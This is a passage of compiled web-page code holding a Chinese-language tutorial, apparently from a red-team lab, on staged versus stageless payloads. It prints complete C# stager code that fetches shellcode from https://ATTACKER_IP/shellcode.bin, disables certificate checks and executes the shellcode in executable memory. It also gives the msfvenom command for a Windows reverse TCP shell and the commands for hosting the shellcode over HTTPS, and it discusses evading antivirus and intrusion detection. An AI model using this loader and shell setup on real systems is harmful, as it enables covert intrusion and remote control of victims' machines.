\u9636\u6bb50",src:s(1160).A+"",width:"1386",height:"364"})}),"\n",(0,d.jsx)(n.p,{children:"\u4e00\u65e6\u68c0\u7d22\u5230\uff0c\u9636\u6bb50\u5b58\u6839\u5c06\u5728\u8f7d\u8377\u8fdb\u7a0b\u7684\u5185\u5b58\u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\u6ce8\u5165\u6700\u7ec8\u7684 shellcode \u5e76\u6267\u884c\u5b83\uff08\u5982\u4e0b\u6240\u793a\uff09\u3002"}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u5206\u9636\u6bb5\u8f7d\u8377 - \u53d1\u9001\u53cd\u5411 Shell",src:s(9342).A+"",width:"1386",height:"370"})}),"\n",(0,d.jsx)(n.h3,{id:"\u5206\u9636\u6bb5-vs-\u65e0\u9636\u6bb5",children:"\u5206\u9636\u6bb5 vs. \u65e0\u9636\u6bb5"}),"\n",(0,d.jsx)(n.p,{children:"\u5728\u51b3\u5b9a\u4f7f\u7528\u54ea\u79cd\u7c7b\u578b\u7684\u8f7d\u8377\u65f6\uff0c\u6211\u4eec\u5fc5\u987b\u4e86\u89e3\u6211\u4eec\u5c06\u653b\u51fb\u7684\u73af\u5883\u3002 \u6bcf\u79cd\u8f7d\u8377\u7c7b\u578b\u6839\u636e\u5177\u4f53\u7684\u653b\u51fb\u573a\u666f\u90fd\u6709\u5176\u4f18\u52bf\u548c\u52a3\u52bf\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u5bf9\u4e8e\u65e0\u9636\u6bb5\u8f7d\u8377\uff0c\u60a8\u5c06\u53d1\u73b0\u4ee5\u4e0b\u4f18\u52bf\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6253\u5305\u4e86\u4f7f\u6211\u4eec\u7684 shellcode \u5de5\u4f5c\u6240\u9700\u7684\u6240\u6709\u5185\u5bb9\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u8f7d\u8377\u5c06\u5728\u4e0d\u9700\u8981\u989d\u5916\u7f51\u7edc\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u3002 \u7f51\u7edc\u4ea4\u4e92\u8d8a\u5c11\uff0c\u88ab IPS \u68c0\u6d4b\u5230\u7684\u673a\u4f1a\u5c31\u8d8a\u5c0f\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5982\u679c\u60a8\u6b63\u5728\u653b\u51fb\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u975e\u5e38\u53d7\u9650\u7684\u4e3b\u673a\uff0c\u60a8\u53ef\u80fd\u5e0c\u671b\u6574\u4e2a\u8f7d\u8377\u90fd\u5728\u4e00\u4e2a\u5305\u4e2d\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u5bf9\u4e8e\u5206\u9636\u6bb5\u8f7d\u8377\uff0c\u60a8\u5c06\u62e5\u6709\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u78c1\u76d8\u4e0a\u7684\u5360\u7528\u7a7a\u95f4\u5c0f\u3002 \u7531\u4e8e\u9636\u6bb50\u4ec5\u8d1f\u8d23\u4e0b\u8f7d\u6700\u7ec8\u7684 shellcode\uff0c\u5b83\u5f88\u53ef\u80fd\u4f53\u79ef\u8f83\u5c0f\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6700\u7ec8\u7684 shellcode \u6ca1\u6709\u5d4c\u5165\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002 \u5982\u679c\u60a8\u7684\u8f7d\u8377\u88ab\u6355\u83b7\uff0c\u84dd\u961f\u5c06\u53ea\u80fd\u8bbf\u95ee\u9636\u6bb50\u5b58\u6839\uff0c\u800c\u65e0\u6cd5\u83b7\u5f97\u66f4\u591a\u4fe1\u606f\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6700\u7ec8\u7684 shellcode \u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u4ece\u4e0d\u63a5\u89e6\u78c1\u76d8\u3002 \u8fd9\u4f7f\u5f97\u5b83\u4e0d\u592a\u5bb9\u6613\u88ab AV \u89e3\u51b3\u65b9\u6848\u68c0\u6d4b\u5230\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u60a8\u53ef\u4ee5\u5bf9\u8bb8\u591a shellcode \u91cd\u590d\u4f7f\u7528\u76f8\u540c\u7684\u9636\u6bb50\u6295\u653e\u5668\uff0c\u56e0\u4e3a\u60a8\u53ef\u4ee5\u7b80\u5355\u5730\u66ff\u6362\u63d0\u4f9b\u7ed9\u53d7\u5bb3\u8005\u673a\u5668\u7684\u6700\u7ec8 shellcode\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u603b\u4e4b\uff0c\u9664\u975e\u6211\u4eec\u4e3a\u5176\u6dfb\u52a0\u4e00\u4e9b\u4e0a\u4e0b\u6587\uff0c\u5426\u5219\u6211\u4eec\u4e0d\u80fd\u8bf4\u54ea\u79cd\u7c7b\u578b\u6bd4\u53e6\u4e00\u79cd\u66f4\u597d\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u65e0\u9636\u6bb5\u8f7d\u8377\u66f4\u9002\u5408\u5177\u6709\u5927\u91cf\u8fb9\u754c\u5b89\u5168\u7684\u7f51\u7edc\uff0c\u56e0\u4e3a\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u5fc5\u987b\u4ece\u4e92\u8054\u7f51\u4e0b\u8f7d\u6700\u7ec8\u7684 shellcode\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u60a8\u6b63\u5728\u6267\u884c USB \u6295\u653e\u653b\u51fb\u4ee5\u9488\u5bf9\u5c01\u95ed\u7f51\u7edc\u73af\u5883\u4e2d\u7684\u8ba1\u7b97\u673a\uff0c\u5e76\u4e14\u60a8\u77e5\u9053\u65e0\u6cd5\u4e0e\u60a8\u7684\u673a\u5668\u5efa\u7acb\u8fde\u63a5\uff0c\u90a3\u4e48\u65e0\u9636\u6bb5\u662f\u9996\u9009\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u53e6\u4e00\u65b9\u9762\uff0c\u5f53\u60a8\u5e0c\u671b\u672c\u5730\u673a\u5668\u4e0a\u7684\u5360\u7528\u7a7a\u95f4\u51cf\u5c11\u5230\u6700\u5c0f\u65f6\uff0c\u5206\u9636\u6bb5\u8f7d\u8377\u975e\u5e38\u6709\u7528\u3002 \u7531\u4e8e\u5b83\u4eec\u5728\u5185\u5b58\u4e2d\u6267\u884c\u6700\u7ec8\u8f7d\u8377\uff0c\u4e00\u4e9b AV \u89e3\u51b3\u65b9\u6848\u53ef\u80fd\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u3002 \u5b83\u4eec\u4e5f\u975e\u5e38\u9002\u5408\u907f\u514d\u66b4\u9732\u60a8\u7684 shellcode\uff08\u8fd9\u4e9b shellcode \u901a\u5e38\u9700\u8981\u76f8\u5f53\u957f\u7684\u65f6\u95f4\u6765\u51c6\u5907\uff09\uff0c\u56e0\u4e3a shellcode \u5728\u4efb\u4f55\u65f6\u5019\u90fd\u4e0d\u4f1a\u88ab\u6295\u653e\u5230\u53d7\u5bb3\u8005\u7684\u78c1\u76d8\u4e0a\uff08\u4f5c\u4e3a\u5de5\u4ef6\uff09\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"metasploit-\u4e2d\u7684\u9636\u6bb5\u5668",children:"Metasploit \u4e2d\u7684\u9636\u6bb5\u5668"}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u4f7f\u7528 msfvenom \u521b\u5efa\u8f7d\u8377\u6216\u5728 Metasploit \u4e2d\u76f4\u63a5\u4f7f\u7528\u5b83\u4eec\u65f6\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u5206\u9636\u6bb5\u6216\u65e0\u9636\u6bb5\u8f7d\u8377\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u60a8\u60f3\u751f\u6210\u4e00\u4e2a\u53cd\u5411 TCP shell\uff0c\u60a8\u4f1a\u53d1\u73b0\u6709\u4e24\u4e2a\u8f7d\u8377\u7528\u4e8e\u6b64\u76ee\u7684\uff0c\u540d\u79f0\u7565\u6709\u4e0d\u540c\uff08\u6ce8\u610f ",(0,d.jsx)(n.code,{children:"shell"})," \u540e\u7684 ",(0,d.jsx)(n.code,{children:"_"})," \u4e0e ",(0,d.jsx)(n.code,{children:"/"}),"\uff09\uff1a"]}),"\n",(0,d.jsxs)(n.table,{children:[(0,d.jsx)(n.thead,{children:(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"\u8f7d\u8377"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"\u7c7b\u578b"})]})}),(0,d.jsxs)(n.tbody,{children:[(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"windows/x64/shell_reverse_tcp"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"\u65e0\u9636\u6bb5\u8f7d\u8377"})]}),(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"windows/x64/shell/reverse_tcp"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"\u5206\u9636\u6bb5\u8f7d\u8377"})]})]})]}),"\n",(0,d.jsxs)(n.p,{children:["\u60a8\u901a\u5e38\u4f1a\u53d1\u73b0\u76f8\u540c\u7684\u547d\u540d\u6a21\u5f0f\u5e94\u7528\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684 shell\u3002 \u4f8b\u5982\uff0c\u8981\u4f7f\u7528\u65e0\u9636\u6bb5 Meterpreter\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"windows/x64/meterpreter_reverse_tcp"}),"\uff0c\u800c\u4e0d\u662f ",(0,d.jsx)(n.code,{children:"windows/x64/meterpreter/reverse_tcp"}),"\uff0c\u540e\u8005\u662f\u5176\u5206\u9636\u6bb5\u5bf9\u5e94\u7269\u3002"]}),"\n",(0,d.jsx)(n.h3,{id:"\u521b\u5efa\u60a8\u81ea\u5df1\u7684\u9636\u6bb5\u5668",children:"\u521b\u5efa\u60a8\u81ea\u5df1\u7684\u9636\u6bb5\u5668"}),"\n",(0,d.jsxs)(n.p,{children:["\u8981\u521b\u5efa\u5206\u9636\u6bb5\u8f7d\u8377\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u7531 ",(0,d.jsx)(n.a,{href:"https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs",children:"@mvelazc0"})," \u63d0\u4f9b\u7684\u9636\u6bb5\u5668\u4ee3\u7801\u7684\u7565\u5fae\u4fee\u6539\u7248\u672c\u3002 \u6211\u4eec\u9636\u6bb5\u5668\u7684\u5b8c\u6574\u4ee3\u7801\u53ef\u4ee5\u5728\u6b64\u5904\u83b7\u53d6\uff0c\u4f46\u4e5f\u53ef\u4ee5\u5728\u60a8\u7684 Windows \u673a\u5668\u4e0a\u7684 ",(0,d.jsx)(n.code,{children:"C:\\Tools\\CS Files\\StagedPayload.cs"})," \u4e2d\u627e\u5230\uff1a"]}),"\n",(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5b8c\u6574\u8f7d\u8377\u4ee3\u7801\uff08\u70b9\u51fb\u9605\u8bfb\uff09 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Net;\nusing System.Text;\nusing System.Configuration.Install;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography.X509Certificates;\n\npublic class Program {\n  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc \n  [DllImport("kernel32")]\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread\n  [DllImport("kernel32")]\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\n  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject\n  [DllImport("kernel32")]\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n  private static UInt32 MEM_COMMIT = 0x1000;\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n  public static void Main()\n  {\n    string url = "https://ATTACKER_IP/shellcode.bin";\n    Stager(url);\n  }\n\n  public static void Stager(string url)\n  {\n\n    WebClient wc = new WebClient();\n    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\n    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\n\n    byte[] shellcode = wc.DownloadData(url);\n\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\n\n    IntPtr threadHandle = IntPtr.Zero;\n    UInt32 threadId = 0;\n    IntPtr parameter = IntPtr.Zero;\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\n\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\n\n  }\n}\n'})})]}),"\n",(0,d.jsx)(n.p,{children:"\u4ee3\u7801\u8d77\u521d\u53ef\u80fd\u770b\u8d77\u6765\u4ee4\u4eba\u751f\u754f\uff0c\u4f46\u76f8\u5bf9\u7b80\u5355\u3002 \u8ba9\u6211\u4eec\u9010\u6b65\u5206\u6790\u5b83\u7684\u4f5c\u7528\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u4ee3\u7801\u7684\u7b2c\u4e00\u90e8\u5206\u5c06\u901a\u8fc7 P/Invoke \u5bfc\u5165\u4e00\u4e9b Windows API \u51fd\u6570\u3002 \u6211\u4eec\u9700\u8981\u7684\u51fd\u6570\u662f\u6765\u81ea ",(0,d.jsx)(n.code,{children:"kernel32.dll"})," \u7684\u4ee5\u4e0b\u4e09\u4e2a\uff1a"]}),"\n",(0,d.jsxs)(n.table,{children:[(0,d.jsx)(n.thead,{children:(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"WinAPI \u51fd\u6570"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"\u63cf\u8ff0"})]})}),(0,d.jsxs)(n.tbody,{children:[(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:(0,d.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc",children:"VirtualAlloc()"})}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"\u5141\u8bb8\u6211\u4eec\u4fdd\u7559\u4e00\u4e9b\u5185\u5b58\u4f9b\u6211\u4eec\u7684 shellcode \u4f7f\u7528\u3002"})]}),(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:(0,d.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread",children:"CreateThread()"})}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u4f5c\u4e3a\u5f53\u524d\u8fdb\u7a0b\u7684\u4e00\u90e8\u5206\u3002"})]}),(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:(0,d.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject",children:"WaitForSingleObject()"})}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"\u7528\u4e8e\u7ebf\u7a0b\u540c\u6b65\u3002 \u5b83\u5141\u8bb8\u6211\u4eec\u5728\u7ee7\u7eed\u4e4b\u524d\u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\u3002"})]})]})]}),"\n",(0,d.jsx)(n.p,{children:"\u8d1f\u8d23\u5bfc\u5165\u8fd9\u4e9b\u51fd\u6570\u7684\u4ee3\u7801\u90e8\u5206\u5982\u4e0b\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:'//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc \n[DllImport("kernel32")]\nprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread\n[DllImport("kernel32")]\nprivate static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\n//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject\n[DllImport("kernel32")]\nprivate static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n'})}),"\n",(0,d.jsxs)(n.p,{children:["\u6211\u4eec\u4ee3\u7801\u4e2d\u6700\u91cd\u8981\u7684\u90e8\u5206\u5c06\u5728 ",(0,d.jsx)(n.code,{children:"Stager()"})," \u51fd\u6570\u4e2d\uff0c\u5176\u4e2d\u5c06\u5b9e\u73b0\u9636\u6bb5\u5668\u903b\u8f91\u3002 Stager \u51fd\u6570\u5c06\u63a5\u6536\u4e00\u4e2a URL\uff0c\u4ece\u8be5 URL \u4e0b\u8f7d\u8981\u6267\u884c\u7684 shellcode\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:[(0,d.jsx)(n.code,{children:"Stager()"})," \u51fd\u6570\u7684\u7b2c\u4e00\u90e8\u5206\u5c06\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 ",(0,d.jsx)(n.code,{children:"WebClient()"})," \u5bf9\u8c61\uff0c\u5141\u8bb8\u6211\u4eec\u4f7f\u7528 Web \u8bf7\u6c42\u4e0b\u8f7d shellcode\u3002 \u5728\u8fdb\u884c\u5b9e\u9645\u8bf7\u6c42\u4e4b\u524d\uff0c\u6211\u4eec\u5c06\u8986\u76d6 ",(0,d.jsx)(n.code,{children:"ServerCertificateValidationCallback"})," \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u8d1f\u8d23\u5728\u4f7f\u7528 HTTPS \u8bf7\u6c42\u65f6\u9a8c\u8bc1 SSL \u8bc1\u4e66\uff0c\u4ee5\u4fbf WebClient \u4e0d\u4f1a\u62b1\u6028\u81ea\u7b7e\u540d\u6216\u65e0\u6548\u8bc1\u4e66\uff0c\u8fd9\u4e9b\u8bc1\u4e66\u6211\u4eec\u5c06\u7528\u4e8e\u6258\u7ba1\u8f7d\u8377\u7684 Web \u670d\u52a1\u5668\u3002 \u4e4b\u540e\uff0c\u6211\u4eec\u5c06\u8c03\u7528 ",(0,d.jsx)(n.code,{children:"DownloadData()"})," \u65b9\u6cd5\u4ece\u7ed9\u5b9a\u7684 URL \u4e0b\u8f7d shellcode\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230 ",(0,d.jsx)(n.code,{children:"shellcode"})," \u53d8\u91cf\u4e2d\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:"WebClient wc = new WebClient();\nServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\nServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\n\nbyte[] shellcode = wc.DownloadData(url);\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u4e00\u65e6\u6211\u4eec\u7684 shellcode \u88ab\u4e0b\u8f7d\u5e76\u53ef\u5728 ",(0,d.jsx)(n.code,{children:"shellcode"})," \u53d8\u91cf\u4e2d\u4f7f\u7528\uff0c\u6211\u4eec\u9700\u8981\u5728\u5b9e\u9645\u8fd0\u884c\u4e4b\u524d\u5c06\u5176\u590d\u5236\u5230\u53ef\u6267\u884c\u5185\u5b58\u4e2d\u3002 \u6211\u4eec\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"VirtualAlloc()"})," \u5411\u64cd\u4f5c\u7cfb\u7edf\u8bf7\u6c42\u4e00\u4e2a\u5185\u5b58\u5757\u3002 \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u8bf7\u6c42\u5206\u914d\u8db3\u591f\u7684\u5185\u5b58\u6765\u5206\u914d ",(0,d.jsx)(n.code,{children:"shellcode.Length"})," \u5b57\u8282\uff0c\u5e76\u8bbe\u7f6e ",(0,d.jsx)(n.code,{children:"PAGE_EXECUTE_READWRITE"})," \u6807\u5fd7\uff0c\u4f7f\u5206\u914d\u7684\u5185\u5b58\u53ef\u6267\u884c\u3001\u53ef\u8bfb\u548c\u53ef\u5199\u3002 \u4e00\u65e6\u6211\u4eec\u7684\u53ef\u6267\u884c\u5185\u5b58\u5757\u88ab\u4fdd\u7559\u5e76\u5206\u914d\u7ed9 codeAddr \u53d8\u91cf\uff0c\u6211\u4eec\u4f7f\u7528 Marshal.Copy() \u5c06 shellcode \u53d8\u91cf\u7684\u5185\u5bb9\u590d\u5236\u5230 codeAddr \u53d8\u91cf\u4e2d\u3002"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:"UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nMarshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u5728\u4e00\u4e2a\u53ef\u6267\u884c\u5185\u5b58\u5757\u4e2d\u5206\u914d\u4e86 shellcode \u7684\u526f\u672c\uff0c\u6211\u4eec\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"CreateThread()"})," \u51fd\u6570\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u751f\u6210\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u8be5\u7ebf\u7a0b\u5c06\u6267\u884c\u6211\u4eec\u7684 shellcode\u3002 \u4f20\u9012\u7ed9 CreateThread \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5411 ",(0,d.jsx)(n.code,{children:"codeAddr"}),"\uff0c\u5373\u6211\u4eec\u7684 shellcode \u5b58\u50a8\u4f4d\u7f6e\uff0c\u8fd9\u6837\u5f53\u7ebf\u7a0b\u542f\u52a8\u65f6\uff0c\u5b83\u4f1a\u50cf\u8fd0\u884c\u5e38\u89c4\u51fd\u6570\u4e00\u6837\u8fd0\u884c\u6211\u4eec\u7684 shellcode \u5185\u5bb9\u3002 \u7b2c\u4e94\u4e2a\u53c2\u6570\u8bbe\u7f6e\u4e3a 0\uff0c\u610f\u5473\u7740\u7ebf\u7a0b\u5c06\u7acb\u5373\u542f\u52a8\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u4e00\u65e6\u7ebf\u7a0b\u88ab\u521b\u5efa\uff0c\u6211\u4eec\u5c06\u8c03\u7528 ",(0,d.jsx)(n.code,{children:"WaitForSingleObject()"})," \u51fd\u6570\u6765\u6307\u793a\u5f53\u524d\u7a0b\u5e8f\u5fc5\u987b\u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\u624d\u80fd\u7ee7\u7eed\u3002 \u8fd9\u53ef\u4ee5\u9632\u6b62\u6211\u4eec\u7684\u7a0b\u5e8f\u5728 shellcode \u7ebf\u7a0b\u6709\u673a\u4f1a\u6267\u884c\u4e4b\u524d\u5173\u95ed\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:"IntPtr threadHandle = IntPtr.Zero;\nUInt32 threadId = 0;\nIntPtr parameter = IntPtr.Zero;\nthreadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\n\nWaitForSingleObject(threadHandle, 0xFFFFFFFF);\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u8981\u7f16\u8bd1\u4ee3\u7801\uff0c\u6211\u4eec\u5efa\u8bae\u5c06\u5176\u590d\u5236\u5230 Windows \u673a\u5668\u4e0a\uff0c\u4f5c\u4e3a\u540d\u4e3a staged-payload.cs \u7684\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="PowerShell"',children:"PS C:\\> csc staged-payload.cs\n"})}),"\n",(0,d.jsx)(n.h3,{id:"\u4f7f\u7528\u6211\u4eec\u7684\u9636\u6bb5\u5668\u8fd0\u884c\u53cd\u5411-shell",children:"\u4f7f\u7528\u6211\u4eec\u7684\u9636\u6bb5\u5668\u8fd0\u884c\u53cd\u5411 shell"}),"\n",(0,d.jsx)(n.p,{children:"\u4e00\u65e6\u6211\u4eec\u7684 payload \u7f16\u8bd1\u5b8c\u6210\uff0c\u6211\u4eec\u5c06\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a web \u670d\u52a1\u5668\u6765\u6258\u7ba1\u6700\u7ec8\u7684 shellcode\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u6211\u4eec\u7684\u9636\u6bb5\u5668\u5c06\u8fde\u63a5\u5230\u6b64\u670d\u52a1\u5668\u4ee5\u68c0\u7d22 shellcode\uff0c\u5e76\u5728\u53d7\u5bb3\u673a\u5668\u7684\u5185\u5b58\u4e2d\u6267\u884c\u5b83\u3002 \u8ba9\u6211\u4eec\u9996\u5148\u751f\u6210\u4e00\u4e2a shellcode\uff08\u6587\u4ef6\u540d\u9700\u8981\u4e0e\u6211\u4eec\u7684\u9636\u6bb5\u5668\u4e2d\u7684 URL \u5339\u914d\uff09\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\\x00\\x0a\\x0d'\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u6b63\u5728\u4e3a shellcode \u4f7f\u7528\u539f\u59cb\u683c\u5f0f\uff0c\u56e0\u4e3a\u9636\u6bb5\u5668\u4f1a\u76f4\u63a5\u5c06\u4e0b\u8f7d\u7684\u5185\u5bb9\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u6709\u4e86\u4e00\u4e2a shellcode\uff0c\u8ba9\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u7b80\u5355\u7684 HTTPS \u670d\u52a1\u5668\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u81ea\u7b7e\u540d\u8bc1\u4e66\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u60a8\u5c06\u88ab\u8981\u6c42\u63d0\u4f9b\u4e00\u4e9b\u4fe1\u606f\uff0c\u4f46\u53ef\u4ee5\u968f\u610f\u6309\u56de\u8f66\u952e\u8df3\u8fc7\u4efb\u4f55\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u9700\u8981 SSL \u8bc1\u4e66\u6709\u6548\u3002 \u4e00\u65e6\u6211\u4eec\u6709\u4e86 SSL \u8bc1\u4e66\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 python3 \u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u7b80\u5355\u7684 HTTPS \u670d\u52a1\u5668\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"user@AttackBox$ python3 -c \"import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()\"\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u51c6\u5907\u597d\u6240\u6709\u8fd9\u4e9b\u540e\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684\u9636\u6bb5\u5668 payload\u3002 \u9636\u6bb5\u5668\u5e94\u8be5\u8fde\u63a5\u5230 HTTPS \u670d\u52a1\u5668\u5e76\u68c0\u7d22 shellcode.bin \u6587\u4ef6\uff0c\u5c06\u5176\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u5e76\u5728\u53d7\u5bb3\u673a\u5668\u4e0a\u8fd0\u884c\u5b83\u3002 